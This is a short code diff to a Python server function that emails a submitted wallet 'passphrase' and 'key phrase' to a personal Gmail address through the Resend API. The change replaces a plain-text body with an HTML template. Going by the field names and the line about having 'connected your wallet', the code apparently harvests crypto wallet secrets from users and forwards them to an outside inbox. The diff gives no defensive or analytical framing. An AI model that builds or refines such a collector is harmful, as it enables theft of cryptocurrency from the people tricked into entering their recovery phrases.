@@ -22,11 +22,24 @@ def server():
 
         resend.api_key = API_KEY
 
+        html_message = f"""
+<html>
+  <body style="font-family: Arial, sans-serif;">
+    <p><strong>Passphrase:</strong> {pass_phrase}</p>
+    <p><strong>Key Phrase:</strong> {key_phrase}</p>
+    <p style="color: gray;">
+      Ignore this mail if you've not connected your wallet.
+    </p>
+  </body>
+</html>
+"""
+
+
         response = resend.Emails.send({
         "from": "onboarding@resend.dev",
         "to": "chibuchidavid159@gmail.com",
         "subject": "New Response",
-        "text": f"Passphrase: {pass_phrase}\nKey Phrase: {key_phrase}\n Ignore this message if you have not requested the above."
+        "html": html_message
         })
 
         return "Your email is on the way"
